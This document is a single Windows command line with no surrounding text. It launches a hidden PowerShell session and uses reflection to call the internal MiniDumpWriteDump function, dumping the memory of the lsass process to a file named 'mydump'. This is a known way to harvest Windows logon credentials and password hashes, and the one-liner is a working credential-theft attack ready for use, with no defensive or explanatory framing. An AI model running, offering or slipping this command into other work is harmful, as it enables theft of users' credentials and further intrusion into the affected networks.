cmd.exe /c powershell -nop -wind hidden -noni “$proc = ps lsass;$FileStream = New-Object IO.FileStream(‘mydump’, [IO.FileMode]::Create);$Result = ((([PSObject].Assembly.GetType(‘System.Management.Automation.WindowsErrorReporting’)).GetNestedType(‘NativeMethods’, ‘NonPublic’)).GetMethod(‘MiniDumpWriteDump’, ([Reflection.BindingFlags] ‘NonPublic, Static’))).Invoke($null,@($proc.Handle,$proc.Id,$FileStream.SafeFileHandle,[UInt32] 2,[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero));exit;”
